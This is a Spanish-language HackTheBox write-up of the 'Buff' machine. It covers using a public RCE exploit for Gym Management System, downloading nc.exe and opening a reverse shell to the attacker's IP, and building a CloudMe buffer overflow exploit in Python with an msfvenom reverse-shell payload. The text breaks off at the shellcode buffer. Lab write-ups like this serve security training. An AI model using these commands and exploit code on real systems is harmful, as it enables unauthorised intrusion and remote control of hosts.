&lt;p&gt;Buscamos en Searchsploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# searchsploit Gym Management                               &lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                    |  Path
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Gym Management System 1.0 - &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt; SQL Injection                                                                                    | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                 | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                           | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                 | php/webapps/48506.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un exploit de RCE y probamos a utilizarlo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python GymManagement.py                                                                                                                                     1 ⨯&lt;/span&gt;
            /&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
/vvvvvvvvvvvv &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------&lt;/span&gt;,
&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;^^^^^^^^^^^^ /&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BOKU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=====================&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;

(+) Usage:       python GymManagement.py &amp;lt;WEBAPP_URL&amp;gt;
(+) Example:     python GymManagement.py &apos;https://10.0.0.3:443/gym/&apos;
                                                                                                                                                                    
┌──(root💀pro)-[/home/…/Escritorio/HTB/Buff/exploits]
└─# python GymManagement.py http://10.10.10.198:8080/                                                                                                         255 ⨯
            /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
/vvvvvvvvvvvv &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-------------------------------------,
&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;^^^^^^^^^^^^ /&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BOKU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=====================&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;

[+] Successfully connected to webshell.
C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ampp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tdocs&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ym&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pload&amp;gt; whoami
�PNG
▒
buff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;haun
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que con esta shell no podemos movernos hacia atras en directorios etc, asique probamos a pasarnos un nc.exe para enviarnos un R-Shell potente.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; curl http://10.10.16.4/nc.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; nc.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Compartimos un server python3 -m http.server 80 con el recurso de nc.exe&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; nc.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd 10.10.16.4 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos ponemos a la escucha:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.198] 49753
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17134.1610]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt;

Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;haun&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop

14/07/2020  13:27    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
14/07/2020  13:27    &amp;lt;DIR&amp;gt;          ..
06/09/2021  11:47                34 user.txt
               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             34 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   7,623,385,088 bytes free

&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

user.txt
2363dc8a282b3f13bad614f6fxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a subir el winPEASx86 para enumerar el sistema:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; curl http://10.10.16.5/winPEASx86.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; winPEASx86.exe
�PNG
▒

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;buffer-overflow&quot;&gt;BUFFER OVERFLOW&lt;/h1&gt;
&lt;p&gt;Procedemos a hacer el Buffer OverFlow en una maquina windows 7 a nivel local con el binario de CloudMe para posteriormente repetir el proceso
en la maquina victima Buff.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Requisitos: 
- Immunity Debugger
- binario Malicioso &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;puerto 8888&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; CloudMe
- chisel &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Port Forwarding&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt;####################### -- BOF -- ##############################
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos definimos un archivo en python3 llamado exploit.py&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ppython3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        payload = b&apos;A&apos;*5000

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos creamos con pattern_create.rb un listado de 5 mil caracteres aleatorios para introducirlos como PAYLOAD EN NUESTRO exploit.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3A.. .. .. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le metemos como payload la siguiente linea para identificar la junk antes del EIP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        # Modificamos el payload para pasarle los caracteres creados con pattern-create e identificar el valor del EIP
        # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000

        payload = b&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk&apos;

        # Posteriormente cogemos el numero del registro del [EIP] y se lo pasamos a pattern-offset
        # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Chequeamos con el Immunity Debuger el numero del EIP »&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 69423569 &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exact match at offset 1052
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos una vez identificada el offset y controlado el EIP a enviar una cadena de Caracteres post EIP para ver donde se almacenan&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        # Posteriormente cogemos el numero del registro del [EIP] y se lo pasamos a pattern-offset
        # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

        offset = 1052
        before_EIP = b&apos;A&apos;*offset
        EIP = b&apos;BBBB&apos;
        after_EIP = b&apos;C&apos;*300

        payload = before_EIP + EIP + after_EIP
        # Lanzando este Payload verificamos que tenemos el control del EIP y nos fijamos a donde van nuestras Cccs
        # Ahora toca buscar un OPCODE (instrucciones a bajo nivel) para que apunte a un JMP una direccion de Salto para especificar en el EIP

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para crear nuestras instruciones maliciosas a nivel local. -a (arquitectura) -b (BADChars) -e (encoded ) -f (en C )
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.233.133 LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c EXITFUNC=thread&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=443 -b &quot;\X00&quot; -e x86/shikata_ga_nai -f c EXITFUNC=thread                                                                             1 ⨯&lt;/span&gt;
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;iteration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
